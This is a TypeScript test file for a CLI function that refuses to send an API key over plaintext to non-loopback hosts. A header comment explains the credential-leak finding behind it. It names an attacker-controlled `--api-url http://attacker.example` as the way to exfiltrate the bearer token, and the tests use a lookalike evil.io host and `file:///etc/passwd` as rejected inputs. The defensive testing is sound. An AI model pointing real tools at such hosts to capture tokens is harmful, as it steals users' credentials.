/**
 * `--api-url` decides where the API key is sent. Guard it like the credential path it is.
 *
 * Found in the pre-publish security review (2026-08-19). resolveConfig accepted ANY string as the
 * api-url and then sent the WRITE_APPSEC bearer token to it verbatim in an Authorization header.
 * `--api-url http://attacker.example` — from a copy-pasted command, a poisoned CI variable, or a
 * tampered ~/.config/shadowspan/config.json — exfiltrated the token in CLEARTEXT while the user
 * saw a normal-looking scan. This is a public CLI, so that is not a theoretical path.
 *
 * The rule: https anywhere; http ONLY for loopback, where there is no network to intercept and
 * self-hosted development genuinely needs it. Refused outright rather than warned about — a
 * warning in CI output is a warning nobody reads.
 */
import { describe, it, expect } from 'vitest';
import { assertSafeApiUrl } from '../config.js';

describe('assertSafeApiUrl', () => {
  it('accepts https, including self-hosted hosts', () => {
    expect(() => assertSafeApiUrl('https://app.shadowspan.com')).not.toThrow();
    expect(() => assertSafeApiUrl('https://shadowspan.acme.internal')).not.toThrow();
    expect(() => assertSafeApiUrl('https://localhost:3000')).not.toThrow();
  });

  it('accepts http ONLY on loopback', () => {
    for (const u of ['http://localhost:3000', 'http://127.0.0.1:3000', 'http://[::1]:3000']) {
      expect(() => assertSafeApiUrl(u), u).not.toThrow();
    }
  });

  it('refuses plaintext to any non-loopback host', () => {
    // The credential-exfiltration case this exists for.
    expect(() => assertSafeApiUrl('http://attacker.example')).toThrow(/Refusing to send your API key/);
    expect(() => assertSafeApiUrl('http://10.0.0.5')).toThrow();
  });

  it('is not fooled by a lookalike hostname', () => {
    // Suffix-matching the real host is the classic way past a naive check.
    expect(() => assertSafeApiUrl('http://app.shadowspan.com.evil.io')).toThrow();
  });

  it('refuses non-http schemes and unparseable values', () => {
    expect(() => assertSafeApiUrl('ftp://example.com')).toThrow();
    expect(() => assertSafeApiUrl('file:///etc/passwd')).toThrow();
    expect(() => assertSafeApiUrl('not-a-url')).toThrow(/Invalid --api-url/);
    expect(() => assertSafeApiUrl('')).toThrow();
  });
});
